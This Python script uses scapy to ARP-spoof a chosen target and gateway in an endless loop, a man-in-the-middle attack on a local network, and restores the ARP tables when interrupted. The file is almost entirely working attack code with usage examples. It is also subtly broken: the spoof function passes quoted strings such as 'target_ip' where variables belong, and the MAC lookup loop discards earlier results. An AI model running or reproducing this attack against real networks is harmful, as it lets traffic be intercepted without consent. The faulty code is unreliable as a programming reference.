import scapy.all as scapy
import argparse
import sys
import time


'''
Allow to run script with options as -t or --target
e.g.
python arp_spoofer.py --target 10.0.0.0 --gateway 10.0.2.15 or 
python arp_spoofer.py -t 10.0.0.0 -g 10.0.2.15
'''
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Gateway IP")
    options = parser.parse_args()
    return options


options = get_arguments()


def get_mac(ip):
    # Creating an ARP request to ask who has the specific IP we asked for
    arp_request = scapy.ARP(pdst=ip)
    # arp_request.show()

    # Setting our destination MAC to broadcast MAC address to make sure that
    # it is sent to all the clients on the same network
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show()

    # This variable is your packet that will be sent across the network,
    # as it contains information about MAc and ARP
    # Combining two packets in two one
    arp_request_broadcast = broadcast / arp_request
    # arp_request_broadcast.show()

    try_get_mac = 4
    for i in range(try_get_mac):
        answered_list = scapy.srp(arp_request_broadcast,
                                  timeout=1,
                                  verbose=False)[0]
    # srp stands for send and receive packet.
    if answered_list:
        return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # Getting target host ip address
    target_mac = get_mac(target_ip)

    if target_mac:
        # Creating ARP response packet
        packet = scapy.ARP(op=2,  # op=2 means the ARP sends response, not ARP request
                           pdst="target_ip",  # "Input IP of target computer"
                           hwdst="target_mac",  # Input MAC of target computer
                           psrc="spoof_ip")  # Input IP of the router
        # Sending previously created packet
        scapy.send(packet, verbose=False)

# Restoring MAC address in ARP table
def restore(destination_ip, source_ip):
    # Getting target and gateway mac address
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # Creating ARP response packet with ARP table information
    packet = scapy.ARP(op=2,
                       pdst=destination_ip,
                       hwdst=destination_mac,
                       psrc=source_ip,
                       hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# Sending the packet
sent_packets_count = 0
try: # Execute all the time when attack is performed.
    while True:
        # Spoofing the client that I'm the router
        spoof(options.target, options.gateway)
        # Spoofing the router that I'm the client
        spoof(options.gateway, options.target)
        # Store how many packets was sent and print value
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent:" + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
# Execute restore function when program was stopped
except KeyboardInterrupt:
    print("\nCTRL+C pressed. Resetting ARP tables... Please wait")
    # Execute restore function on target host
    restore(options.target, options.gateway)
    # Execute restore function on gateway
    restore(options.gateway, options.target)
    print("\nARP table restored. Quiting")